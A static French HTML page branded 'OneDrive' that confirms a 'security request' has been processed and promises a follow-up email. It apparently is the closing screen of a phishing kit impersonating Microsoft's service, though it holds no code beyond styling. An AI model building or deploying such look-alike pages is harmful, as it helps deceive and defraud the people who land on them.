
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirmation</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    body {
      background: linear-gradient(to bottom right, #e9f0fc, #ffffff);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background-color: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 100%;
      max-width: 400px;
    }
    .logo {
      color: #0078d4;
      font-weight: bold;
      margin-bottom: 1rem;
      font-size: 1.4rem;
    }
    .message {
      font-size: 1rem;
      margin-bottom: 1rem;
      color: #333;
    }
    .success-icon {
      font-size: 3rem;
      color: #28a745;
      margin: 1rem 0;
    }
    .footer {
      margin-top: 2rem;
      font-size: 0.85rem;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">OneDrive</div>
    <div class="success-icon">✔</div>
    <div class="message">Nous avons reçu et traité votre demande de sécurité.</div>
    <div class="message">Cette requête a été traitée avec succès.</div>
    <div class="message">Un courriel de confirmation vous sera adressé dans un délai de 24 à 48 heures.</div>
    <div class="message">Merci de votre confiance.</div>
    <div class="footer">Vous pouvez maintenant fermer cette fenêtre.</div>
  </div>
</body>
</html>
